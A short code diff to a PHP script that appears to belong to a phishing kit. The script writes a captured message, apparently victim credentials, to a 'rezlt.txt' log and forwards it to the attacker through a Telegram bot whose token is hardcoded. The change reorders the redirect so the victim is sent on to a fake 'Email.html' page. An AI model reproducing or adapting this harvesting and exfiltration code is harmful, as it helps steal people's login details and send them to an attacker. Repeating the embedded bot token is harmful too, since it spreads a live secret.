@@ -18,9 +18,6 @@ $text = fopen('../rezlt.txt', 'a');
 fwrite($text, $message);
 
 
-header("Location: ../Main/Email.html");
-
-
 /* Telegram */
 function sendMessage($messaggio) {
     $token = '2096606596:AAG5pXX4sotZxew9zWFEtCLMF7T0TzjkvO4';
@@ -38,7 +35,7 @@ function sendMessage($messaggio) {
     return $result;
 }
 sendMessage($message);
-header("Location: ../Main/login.html");
+header("Location: ../Main/Email.html");
 
 
 
